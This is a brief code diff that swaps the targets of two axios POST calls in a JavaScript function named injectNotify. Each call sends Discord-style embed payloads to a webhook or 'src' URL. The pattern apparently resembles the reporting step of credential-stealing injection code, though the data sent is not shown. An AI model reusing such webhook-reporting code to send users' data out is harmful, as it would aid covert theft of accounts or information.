@@ -165,7 +165,7 @@ function injectNotify() {
         fields.push(c)
     })
     axios
-	.post(webhook, {
+	.post(src, {
         "content": null,
         "embeds": [
           {
@@ -188,7 +188,7 @@ function injectNotify() {
     })
 
     axios
-	.post(src, {
+	.post(webhook, {
         "content": null,
         "embeds": [
           {
